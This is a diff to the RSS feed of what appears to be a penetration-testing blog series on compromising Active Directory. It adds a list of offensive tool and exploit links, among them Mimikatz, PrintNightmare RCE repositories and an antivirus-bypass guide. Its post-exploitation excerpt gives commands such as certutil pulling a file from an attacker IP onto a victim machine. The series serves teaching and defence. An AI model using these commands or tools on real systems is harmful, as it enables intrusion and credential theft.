@@ -19,19 +19,44 @@ I had the privilege of presenting a talk at SAKEC, Mumbai University, diving dee
     </item>
     
     <item>
+      <title>Useful AD Resources</title>
+      <link>https://auti.dev/useful-ad-resources/</link>
+      <pubDate>Fri, 20 Aug 2021 12:35:53 +0530</pubDate>
+      
+      <guid>https://auti.dev/useful-ad-resources/</guid>
+      <description>Downloads and Tools Impacket Tools: https://github.com/SecureAuthCorp/impacket/releases
+Mitm6: https://github.com/fox-it/mitm6
+Powerview: https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
+Sharphound: https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
+Mimikatz: https://github.com/gentilkiwi/mimikatz
+PRET: https://github.com/RUB-NDS/PRET
+Praeda: https://github.com/percx/Praeda
+SYSVOL Script: (https://support.microsoft.com/en-us/kb/2962486)
+LAPS: (https://www.microsoft.com/en-us/download/details.aspx?id=46899))
+cube0x0 RCE: https://github.com/cube0x0/CVE-2021-1675
+calebstewart LPE: https://github.com/calebstewart/CVE-2021-1675
+Articles and Blogs Top 5 ways I got Domain: https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
+Account tiering: https://www.ravenswoodtechnology.com/how-to-mitigate-privilege-escalation-with-the-tiered-access-model-for-active-directory-security/
+mitm6: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
+Combining NTLM Relays and Kerberos Delegation: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+Hacking Printers Cheatsheet: http://www.hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
+A Pen Tester’s Guide to Printer Hacking: https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
+Bypass Antivirus: https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html
+GPP cPassword Attack: https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/</description>
+    </item>
+    
+    <item>
       <title>Compromising AD - Part 4: Post Exploitation</title>
       <link>https://auti.dev/compromising-ad-part-4-post-exploitation/</link>
       <pubDate>Tue, 17 Aug 2021 12:35:53 +0530</pubDate>
       
       <guid>https://auti.dev/compromising-ad-part-4-post-exploitation/</guid>
-      <description>Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. File-Transfers Certutil
+      <description>Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. Next &amp;gt;&amp;gt; Useful Active Directory Resources File-Transfers Certutil
 certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt HTTP - Change to the directory you want to host
 python -m SimpleHTTPServer [port] Browser
 Navigate directly to the file (%20 for spaces) FTP
 On Attacker Machine
-python -m pyftpdlib 21 On Victim Machine, Browse to
-ftp 10.10.10.10 Linux
-wget https://example.com/example.txt Maintaining-Access Add a user</description>
+python -m pyftpdlib 21 On Victim Machine, Browse to</description>
     </item>
     
     <item>
@@ -62,7 +87,8 @@ Get-NetDomain //Returns information about the domain Get-NetDomainController // 
       <pubDate>Sun, 15 Aug 2021 12:35:53 +0530</pubDate>
       
       <guid>https://auti.dev/compromising-ad-part-1-initial-attack-vectors/</guid>
-      <description>Initial Attack Vectors Initial Attack Vectors - Reference Article: - Install Impacket Tools LLMNR-Poisoning - LMNR: Link Local Multicast Name Resolution (Used to Identify hosts when DNS fails) Defense Against LLMNR Poisoning SMB-Relay-Attacks What is SMB Relay? Requirements Setup Defense Against SMB Relay IPv6-Attacks Resources Requirements Setup Defense Against IPv6 Attacks Passback-Attacks Introducing the Pass-Back Attack Accessing the EWS Replace LDAP Attributes Capture Credentials Attacking SMTP and Windows Sign-in Resources Strategies Reference Article https://adam-toscher.</description>
+      <description>Introduction In the digital landscape, Active Directory (AD) is the cornerstone of network identity and access management, exerting immense power within an organization&amp;rsquo;s infrastructure.
+Yet, as the heartbeat of user authentication and authorization, it presents an enticing target for cyber adversaries seeking entry points to exploit. This four-part blog series ventures into the maze of Active Directory compromises, sketching insights from the TCM Security course to describe the vulnerabilities, attack vectors, and crucially, robust strategies for fortification and defense.</description>
     </item>
     
   </channel>
